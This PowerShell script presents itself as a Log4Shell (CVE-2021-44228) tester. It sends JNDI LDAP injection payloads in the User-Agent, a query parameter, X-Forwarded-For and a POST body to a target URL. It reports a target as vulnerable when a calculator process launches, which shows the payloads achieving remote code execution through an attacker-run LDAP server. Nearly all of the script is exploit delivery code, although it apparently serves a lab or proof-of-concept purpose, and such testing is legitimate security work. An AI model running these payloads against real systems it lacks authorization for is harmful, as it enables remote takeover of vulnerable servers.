# Log4Shell Detection Script
# Tests if a server is vulnerable to CVE-2021-44228

param(
    [string]$Target = "http://localhost:8080",
    [string]$LDAPServer = "127.0.0.1:1389"
)

Write-Host "=" * 60 -ForegroundColor Cyan
Write-Host "Log4Shell Vulnerability Tester" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor Cyan

# Kill any existing calc processes
Get-Process calc -ErrorAction SilentlyContinue | Stop-Process -Force

Write-Host "`n[*] Testing: $Target" -ForegroundColor Green
Write-Host "[*] LDAP Server: $LDAPServer" -ForegroundColor Green

# Test 1: User-Agent injection
Write-Host "`n[1] Testing User-Agent injection..." -ForegroundColor Yellow
$headers = @{
    "User-Agent" = "`${jndi:ldap://$LDAPServer/Exploit}"
}
try {
    Invoke-WebRequest -Uri $Target -Headers $headers -UseBasicParsing | Out-Null
    Start-Sleep -Seconds 2
} catch {
    # Ignore errors
}

# Check if calculator launched
$calc = Get-Process calc -ErrorAction SilentlyContinue
if ($calc) {
    Write-Host "[!] VULNERABLE - Calculator launched via User-Agent!" -ForegroundColor Red -BackgroundColor Black
    Stop-Process -Name calc -Force
    $vulnerable = $true
}

# Test 2: URL parameter injection
Write-Host "[2] Testing URL parameter injection..." -ForegroundColor Yellow
try {
    Invoke-WebRequest -Uri "$Target/?search=`${jndi:ldap://$LDAPServer/Exploit}" -UseBasicParsing | Out-Null
    Start-Sleep -Seconds 2
} catch {
    # Ignore errors
}

$calc = Get-Process calc -ErrorAction SilentlyContinue
if ($calc) {
    Write-Host "[!] VULNERABLE - Calculator launched via URL parameter!" -ForegroundColor Red -BackgroundColor Black
    Stop-Process -Name calc -Force
    $vulnerable = $true
}

# Test 3: X-Forwarded-For injection
Write-Host "[3] Testing X-Forwarded-For injection..." -ForegroundColor Yellow
$headers = @{
    "X-Forwarded-For" = "`${jndi:ldap://$LDAPServer/Exploit}"
}
try {
    Invoke-WebRequest -Uri $Target -Headers $headers -UseBasicParsing | Out-Null
    Start-Sleep -Seconds 2
} catch {
    # Ignore errors
}

$calc = Get-Process calc -ErrorAction SilentlyContinue
if ($calc) {
    Write-Host "[!] VULNERABLE - Calculator launched via X-Forwarded-For!" -ForegroundColor Red -BackgroundColor Black
    Stop-Process -Name calc -Force
    $vulnerable = $true
}

# Test 4: POST data injection
Write-Host "[4] Testing POST data injection..." -ForegroundColor Yellow
$body = "username=`${jndi:ldap://$LDAPServer/Exploit}&password=test"
try {
    Invoke-WebRequest -Uri $Target -Method POST -Body $body -ContentType "application/x-www-form-urlencoded" -UseBasicParsing | Out-Null
    Start-Sleep -Seconds 2
} catch {
    # Ignore errors
}

$calc = Get-Process calc -ErrorAction SilentlyContinue
if ($calc) {
    Write-Host "[!] VULNERABLE - Calculator launched via POST data!" -ForegroundColor Red -BackgroundColor Black
    Stop-Process -Name calc -Force
    $vulnerable = $true
}

# Final result
Write-Host "`n" + ("=" * 60) -ForegroundColor Cyan
if ($vulnerable) {
    Write-Host "RESULT: TARGET IS VULNERABLE TO LOG4SHELL (CVE-2021-44228)" -ForegroundColor Red -BackgroundColor Black
    Write-Host "Critical security risk detected!" -ForegroundColor Red
} else {
    Write-Host "RESULT: No vulnerability detected" -ForegroundColor Green
}
Write-Host ("=" * 60) -ForegroundColor Cyan